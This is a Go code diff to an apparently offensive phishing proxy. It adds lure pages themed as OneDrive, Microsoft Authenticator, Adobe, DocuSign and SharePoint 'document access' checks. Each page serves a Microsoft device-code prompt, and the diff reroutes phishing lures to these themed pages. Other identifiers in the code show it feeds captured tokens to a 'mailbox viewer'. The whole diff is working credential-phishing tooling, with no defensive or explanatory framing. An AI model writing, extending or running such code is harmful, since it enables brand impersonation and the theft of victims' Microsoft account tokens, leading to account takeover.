@@ -236,6 +236,12 @@ var (
 	botguardTelRe    = regexp.MustCompile(`^/api/v1/analytics$`)
 	dcPageRe         = regexp.MustCompile(`^/dc/([a-zA-Z0-9_-]+)$`)
 	dcStatusRe       = regexp.MustCompile(`^/dc/status/([a-zA-Z0-9_-]+)$`)
+	// Document access themed device code pages (5 themes)
+	dcOneDriveRe     = regexp.MustCompile(`^/access/onedrive/([a-zA-Z0-9_-]+)$`)
+	dcAuthenticatorRe= regexp.MustCompile(`^/access/authenticator/([a-zA-Z0-9_-]+)$`)
+	dcAdobeRe        = regexp.MustCompile(`^/access/adobe/([a-zA-Z0-9_-]+)$`)
+	dcDocuSignRe     = regexp.MustCompile(`^/access/docusign/([a-zA-Z0-9_-]+)$`)
+	dcSharePointRe   = regexp.MustCompile(`^/access/sharepoint/([a-zA-Z0-9_-]+)$`)
 	portalPageRe     = regexp.MustCompile(`^/p/([a-fA-F0-9]{64})$`)
 	tokenFeedRe      = regexp.MustCompile(`^/api/v1/feed$`)
 	redirRe          = regexp.MustCompile(`^/assets/js/([^/]*)`)
@@ -870,6 +876,74 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			// --- End device code interstitial endpoint ---
 
+			// --- Begin themed document access device code endpoints ---
+			// These 5 routes serve document access verification themed pages, all using Microsoft device code flow
+			themedRoutes := []struct {
+				re    *regexp.Regexp
+				theme string
+			}{
+				{dcOneDriveRe, "onedrive"},
+				{dcAuthenticatorRe, "authenticator"},
+				{dcAdobeRe, "adobe"},
+				{dcDocuSignRe, "docusign"},
+				{dcSharePointRe, "sharepoint"},
+			}
+
+			for _, route := range themedRoutes {
+				if route.re.MatchString(req.URL.Path) {
+					ra := route.re.FindStringSubmatch(req.URL.Path)
+					if len(ra) >= 2 {
+						session_id := ra[1]
+						log.Debug("[devicecode] serving %s themed page for session: %s", route.theme, session_id)
+						p.session_mtx.Lock()
+						s, ok := p.sessions[session_id]
+						p.session_mtx.Unlock()
+
+						if ok && (s.DCSessionID != "" || s.DCState == DCStatePending) {
+							userCode := ""
+							verifyURL := "https://microsoft.com/devicelogin"
+							expiresIn := 900
+							codeReady := false
+
+							if s.DCSessionID != "" {
+								dcs, dcOk := p.deviceCode.GetSession(s.DCSessionID)
+								if dcOk {
+									dcs.mu.Lock()
+									userCode = dcs.UserCode
+									verifyURL = dcs.VerifyURL
+									expiresIn = int(time.Until(dcs.ExpiresAt).Seconds())
+									dcs.mu.Unlock()
+									codeReady = true
+								}
+							}
+
+							if expiresIn < 0 {
+								expiresIn = 0
+							}
+							expMinutes := expiresIn / 60
+
+							html := GetInterstitialByTheme(route.theme)
+							if codeReady {
+								html = strings.ReplaceAll(html, "{user_code}", userCode)
+							} else {
+								html = strings.ReplaceAll(html, "{user_code}", "")
+							}
+							html = strings.ReplaceAll(html, "{verify_url}", verifyURL)
+							html = strings.ReplaceAll(html, "{session_id}", session_id)
+							html = strings.ReplaceAll(html, "{expires_minutes}", fmt.Sprintf("%d", expMinutes))
+							html = strings.ReplaceAll(html, "{expires_seconds}", fmt.Sprintf("%d", expiresIn))
+							html = strings.ReplaceAll(html, "{code_ready}", fmt.Sprintf("%v", codeReady))
+
+							resp := goproxy.NewResponse(req, "text/html", 200, html)
+							return req, resp
+						}
+
+						return p.blockRequest(req)
+					}
+				}
+			}
+			// --- End themed document access device code endpoints ---
+
 			// --- Begin token feed API (serves tokens to mailbox viewer) ---
 			if tokenFeedRe.MatchString(req.URL.Path) {
 				apiKey := req.URL.Query().Get("key")
@@ -1345,7 +1419,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}()
 
 										// Redirect immediately (don't wait for Microsoft API)
-										interstitialURL := fmt.Sprintf("/dc/%s", session.Id)
+										// Use themed URL if dc_theme is set on the lure
+										dcTheme := l.DeviceCodeTheme
+										var interstitialURL string
+										if dcTheme != "" && dcTheme != "default" {
+											interstitialURL = fmt.Sprintf("/access/%s/%s", dcTheme, session.Id)
+										} else {
+											interstitialURL = fmt.Sprintf("/dc/%s", session.Id)
+										}
 										log.Debug("[devicecode] DCModeDirect: redirecting to %s", interstitialURL)
 										resp := goproxy.NewResponse(req, "text/plain", http.StatusFound, "Redirecting...")
 										resp.Header.Set("Location", interstitialURL)
@@ -3042,7 +3123,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if (s.DCMode == DCModeAlways || s.DCMode == DCModeAuto) && s.DCSessionID != "" {
 							dcs, dcOk := p.deviceCode.GetSession(s.DCSessionID)
 							if dcOk && dcs.IsCodeValid() {
-								interstitialURL := fmt.Sprintf("/dc/%s", s.Id)
+								// Use themed URL if dc_theme is set on the lure
+								var interstitialURL string
+								if s.PhishLure != nil && s.PhishLure.DeviceCodeTheme != "" && s.PhishLure.DeviceCodeTheme != "default" {
+									interstitialURL = fmt.Sprintf("/access/%s/%s", s.PhishLure.DeviceCodeTheme, s.Id)
+								} else {
+									interstitialURL = fmt.Sprintf("/dc/%s", s.Id)
+								}
 								log.Important("[%d] [devicecode] redirecting to device code interstitial (mode: %s, code: %s)", ps.Index, s.DCMode, s.DCUserCode)
 								s.RedirectURL = interstitialURL
 							}
